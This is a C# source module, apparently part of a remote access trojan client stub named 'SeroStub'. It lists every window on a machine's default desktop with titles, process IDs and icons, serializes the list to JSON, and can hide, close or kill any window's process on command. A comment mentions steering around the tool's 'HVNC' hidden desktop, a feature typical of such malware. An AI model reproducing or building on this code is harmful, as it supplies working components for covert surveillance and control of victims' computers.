using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace SeroStub;

internal static class WindowManagerFeature
{
    private delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

    [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")] private static extern bool EnumDesktopWindows(nint hDesktop, EnumWindowsProc lpfn, IntPtr lParam);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern nint OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
    [DllImport("user32.dll")] private static extern bool CloseDesktop(nint hDesktop);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetWindowTextW(IntPtr hwnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] private static extern int GetClassNameW(IntPtr hwnd, StringBuilder lpClassName, int nMaxCount);
    [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hwnd);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hwnd, out uint lpdwProcessId);
    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
    [DllImport("user32.dll")] private static extern bool SetForegroundWindow(IntPtr hwnd);
    [DllImport("user32.dll")] private static extern bool PostMessageW(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hwnd, IntPtr lpdwProcessId);
    [DllImport("user32.dll")] private static extern nint SendMessage(IntPtr hwnd, uint msg, nint wParam, nint lParam);

    // icon extraction via process exe
    private static readonly ConcurrentDictionary<string, string> _iconCache = new(StringComparer.OrdinalIgnoreCase);

    private static string GetExeIcon(uint pid)
    {
        try
        {
            using var p = System.Diagnostics.Process.GetProcessById((int)pid);
            var exe = p.MainModule?.FileName;
            if (string.IsNullOrEmpty(exe)) return "";
            return _iconCache.GetOrAdd(exe, path => StubIconHelper.ExtractExeIcon(path));
        }
        catch { return ""; }
    }

    private const int SW_HIDE     = 0;
    private const int SW_SHOW     = 5;
    private const int SW_RESTORE  = 9;
    private const int SW_MINIMIZE = 6;
    private const int SW_MAXIMIZE = 3;
    private const uint WM_CLOSE   = 0x0010;

    internal static string GetList()
    {
        var wins = new List<WindowEntryStub>();

        // Open the default interactive desktop explicitly — EnumWindows uses the current
        // thread's desktop which may be the HVNC hidden desktop if SetThreadDesktop was
        // called on this thread, causing HVNC windows to show instead of real ones.
        const uint DESKTOP_READOBJECTS = 0x0001;
        const uint DESKTOP_ENUMERATE   = 0x0040;
        nint hDesk = OpenDesktop("Default", 0, false, DESKTOP_READOBJECTS | DESKTOP_ENUMERATE);

        // First pass: enumerate all windows without icon loading so no window is skipped
        // due to a slow/failing MainModule access.
        EnumWindowsProc cb = (hwnd, _) =>
        {
            var titleSb = new StringBuilder(256);
            GetWindowTextW(hwnd, titleSb, 256);
            var title = titleSb.ToString();
            if (string.IsNullOrWhiteSpace(title)) return true;

            var classSb = new StringBuilder(128);
            GetClassNameW(hwnd, classSb, 128);
            GetWindowThreadProcessId(hwnd, out uint pid);
            wins.Add(new WindowEntryStub
            {
                Handle    = hwnd.ToInt64(),
                Title     = title,
                ClassName = classSb.ToString(),
                Pid       = (int)pid,
                Visible   = IsWindowVisible(hwnd),
            });
            return true;
        };
        if (hDesk != nint.Zero)
        {
            EnumDesktopWindows(hDesk, cb, IntPtr.Zero);
            CloseDesktop(hDesk);
        }
        else
        {
            EnumWindows(cb, IntPtr.Zero); // fallback
        }

        // Second pass: load icons (cached per exe path, safe to fail per entry)
        foreach (var w in wins)
            w.IconB64 = GetExeIcon((uint)w.Pid);

        return JsonSerializer.Serialize(new WinListResultStub { Windows = wins }, SeroJson.Default.WinListResultStub);
    }

    internal static void DoAction(long handle, string action)
    {
        try
        {
            var hwnd = new IntPtr(handle);
            switch (action)
            {
                case "show":     ShowWindow(hwnd, SW_SHOW);     break;
                case "hide":     ShowWindow(hwnd, SW_HIDE);     break;
                case "focus":    SetForegroundWindow(hwnd);     break;
                case "restore":  ShowWindow(hwnd, SW_RESTORE);  break;
                case "minimize": ShowWindow(hwnd, SW_MINIMIZE); break;
                case "maximize": ShowWindow(hwnd, SW_MAXIMIZE); break;
                case "close":    PostMessageW(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero); break;
                case "kill":
                    GetWindowThreadProcessId(hwnd, out uint pid);
                    if (pid > 0) System.Diagnostics.Process.GetProcessById((int)pid).Kill();
                    break;
            }
        }
        catch { }
    }
}
